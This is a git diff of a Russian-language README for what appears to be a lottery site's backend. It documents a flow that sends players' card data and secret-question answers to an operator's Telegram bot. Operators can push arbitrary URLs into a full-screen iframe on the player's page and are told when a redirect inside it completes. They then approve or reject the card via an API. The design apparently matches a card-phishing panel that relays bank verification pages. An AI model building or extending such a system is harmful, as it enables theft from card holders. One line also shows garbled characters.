@@ -82,7 +82,7 @@ docker compose logs app --since 2m
 | --- | --- |
 | `setup-server.sh` | Первичная настройка VPS (Docker, firewall, генерация секретов) |
 | `deploy.sh` | Обновление: pull → build → up |
-| `Caddyfile` | HTTPS-прокси д��я bytoloto.com и аналитики |
+| `Caddyfile` | HTTPS-пр��кси д��я bytoloto.com и аналитики |
 | `backup.sh` | Дамп Postgres |
 | `env.production.example` | Шаблон серверного `.env` |
 | `postgres-init/01-umami.sql` | Создание БД для Umami |
@@ -189,10 +189,12 @@ docker compose logs app --since 2m
 - Каждая заявка получает уникальный номер `BL-XXXXXX` (`payment_card.requestNo`, миграция `0007_card_request_no`). Логика — `lib/card-requests.ts`.
 - В Telegram приходит только `№ BL-XXXXXX` + данные карты, без кнопок. Ответ на секретный вопрос приходит как `№ BL-XXXXXX` + ответ (без текста вопроса).
 - Команды оператора в личке с ботом (ответом на сообщение заявки или с номером в тексте):
-  - `BL-XXXXXX https://страница` — игрок со страницы `/cabinet/cards/[id]` автоматически перенаправляется на ссылку (`payment_card.redirectUrl`, опрос каждые 2.5 с).
+  - `BL-XXXXXX https://страница` — на странице `/cabinet/cards/[id]` ссылка открывается во встроенном окне на весь экран (`components/cabinet/cards/card-frame.tsx`, опрос каждые 2.5 с). Первый `load` iframe → `frameStatus="opened"`, любой следующий `load` (редирект внутри окна) → окно закрывается, `frameStatus="finished"` + `frameFinishedAt` (server action `reportCardFrame`), в TG уходит «№ … Страница пройдена». Миграция `0008_card_frame`.
   - `BL-XXXXXX ok` / `+` — подтвердить карту; `BL-XXXXXX no` / `-` — отклонить.
 - Operator API (ключ `OPERATOR_API_KEY` в `/opt/bytoloto/.env`, заголовок `Authorization: Bearer <key>`), файлы `app/api/v1/card-requests/**`, `lib/operator-api.ts`:
   - `GET /api/v1/card-requests?status=pending&limit=50` — список заявок.
   - `GET /api/v1/card-requests/BL-XXXXXX` — одна заявка.
-  - `POST /api/v1/card-requests/BL-XXXXXX` с телом `{"action":"redirect","url":"https://..."}` | `{"action":"approve"}` | `{"action":"reject"}`.
+  - `POST /api/v1/card-requests/BL-XXXXXX` с телом `{"action":"redirect","url":"https://..."}` | `{"action":"approve"|"reject","reason":"..."}` (`reason` до 500 символов → `payment_card.resultReason`, показывается игроку).
+  - В ответе заявки есть `frameStatus`, `frameFinishedAt`, `resultReason`.
   - Ответы: 401 неверный ключ, 404 нет заявки, 409 заявка закрыта, 503 ключ не задан.
+- Документация API с ключом: кнопка «Документация API» в админке → `GET /api/admin/api-docs` (только с админ-сессией, иначе 401). Текст — `lib/api-docs.ts`, ключ подставляется из `OPERATOR_API_KEY`.
